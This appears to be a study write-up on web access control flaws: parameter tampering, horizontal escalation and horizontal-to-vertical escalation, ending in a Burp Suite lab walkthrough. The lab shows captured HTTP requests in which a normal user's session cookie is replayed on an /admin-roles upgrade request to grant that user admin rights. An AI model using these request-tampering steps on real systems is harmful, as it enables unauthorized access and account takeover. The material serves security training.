## Access control vulnerabilities
Access control (or authorization) is the application of constraints on who (or what) 
can perform attempted actions or access resources that they have requested. 
In the context of web applications, access control is dependent on authentication and session management: 

## 1. Parameter-based access control methods
Some applications determine the user's access rights or role at login, and then store this information in a user-controllable location,
such as a hidden field, cookie, or preset query string parameter. 
The application makes subsequent access control decisions based on the submitted value

## For Example

    https://insecure-website.com/login/home.jsp?admin=true
    https://insecure-website.com/login/home.jsp?role=1

This approach is fundamentally insecure because a user can simply modify the value and gain access to functionality to which they are not authorized,
such as administrative functions. 

## 2. Horizontal privilege escalation
Horizontal privilege escalation arises when a user is able to gain access to resources belonging to another user, instead of their own resources of that type. For example, if an employee should only be able to access their own employment and payroll records, but can in fact also access the records of other employees, then this is horizontal privilege escalation. 

 Horizontal privilege escalation attacks may use similar types of exploit methods to vertical privilege escalation. 
 ## For example
 a user might ordinarily access their own account page using a URL like the following: 

    https://insecure-website.com/myaccount?id=123
Now, if an attacker modifies the id parameter value to that of another user, then the attacker might gain access to another user's account page, with associated data and functions. 

## 3. Horizontal to vertical privilege escalation
Often, a horizontal privilege escalation attack can be turned into a vertical privilege escalation, by compromising a more privileged user.
For example, a horizontal escalation might allow an attacker to reset or capture the password belonging to another user.
If the attacker targets an administrative user and compromises their account, then they can gain administrative access and so perform vertical privilege escalation.

## For Example
an attacker might be able to gain access to another user's account page using the parameter tampering technique already described for horizontal privilege escalation:

    https://insecure-website.com/myaccount?id=456
    
If the target user is an application administrator, then the attacker will gain access to an administrative account page. This page might disclose the administrator's password or provide a means of changing it, or might provide direct access to privileged functionality. 
    
    
## LAB
 
 ## 1. STEP
  Asif Is Upgrade User 
  Login in the login page and Caputer The Request In Burp Repeter and  analyze the Request
    
     POST /admin-roles HTTP/1.1
    Host: acca1f871ff59314c0b1124d00580002.web-security-academy.net
    Cookie: session=dhb7aRHg7lEnRb2uRogyfXu2onwMp2jY
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 45
    Origin: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net
    Referer: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net/admin-roles
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    action=upgrade&confirmed=true&username=asif
    

 ## 2.STEP
 Khan Is Local user Log
 Login in the login page and Caputer The Request In Burp Repeter and  analyze the Request 
 
     GET /my-account?id=khan HTTP/1.1
     Host: acca1f871ff59314c0b1124d00580002.web-security-academy.net
     Cookie: session=dhb7aRHg7lEnRb2uRogyfXu2onwMp2jY
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Referer: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net/my-account
     Upgrade-Insecure-Requests: 1
     Sec-Fetch-Dest: document
     Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

 
  ## 3.STEP 
  First some Changing Copy Local user Cookie: Session and past the Upgrade Request and Secand is Change the Nmae just Example 
  Upgrade user name is Asif to change and type khan and send the Request Server and Local user is Upgrade This vulnerabilities
  IS Access-control-vulnerabilities
 
 
 
 
 
 
 
 
 


